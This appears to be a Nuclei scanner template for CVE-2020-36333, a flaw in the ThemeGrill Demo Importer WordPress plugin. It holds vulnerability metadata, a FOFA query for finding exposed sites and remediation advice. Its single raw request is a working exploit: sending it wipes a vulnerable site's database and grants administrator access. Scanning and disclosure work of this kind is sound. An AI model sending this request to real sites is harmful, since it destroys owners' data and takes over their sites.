http:
- matchers:
  - condition: and
    dsl:
    - len(body)==0
    - status_code == 302
    - contains_all(header, "wordpress_logged_in_", "reset=true")
    type: dsl
  raw:
  - 'GET /wp-admin/admin-post.php?do_reset_wordpress=1 HTTP/1.1

    Host: {{Hostname}}


    '
id: CVE-2020-36333
info:
  author: iamnoooob,pdresearch
  classification:
    cve-id: CVE-2020-36333
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 9.1
    cwe-id: CWE-285
    epss-percentile: 0.97718
    epss-score: 0.50218
  description: 'ThemeGrill Demo Importer before 1.6.2 does not require authentication
    for wiping the database due to a reset_wizard_actions hook. In versions 1.3.4
    and above and versions 1.6.1 and below, there is a vulnerability that allows any
    unauthenticated user to wipe the entire database to its default state after which
    they are automatically logged in as an administrator.

    '
  impact: 'Unauthenticated attackers can wipe the entire WordPress database to its
    default state and gain automatic administrator access, resulting in complete site
    takeover and data loss.

    '
  metadata:
    fofa-query: body="/plugins/themegrill-demo-importer"
    max-request: 1
    product: themegrill-demo-importer
    vendor: themegrill
    verified: true
  name: ThemeGrill Demo Importer < 1.6.2 - Database Reset
  reference:
  - https://www.openwall.com/lists/oss-security/2020/02/19/1
  - https://nvd.nist.gov/vuln/detail/CVE-2020-36333
  remediation: 'Upgrade to ThemeGrill Demo Importer version 1.6.2 or later.

    '
  severity: critical
  tags: cve,cve2020,wp,wordpress,wp-plugin,themegrill,vkev,vuln
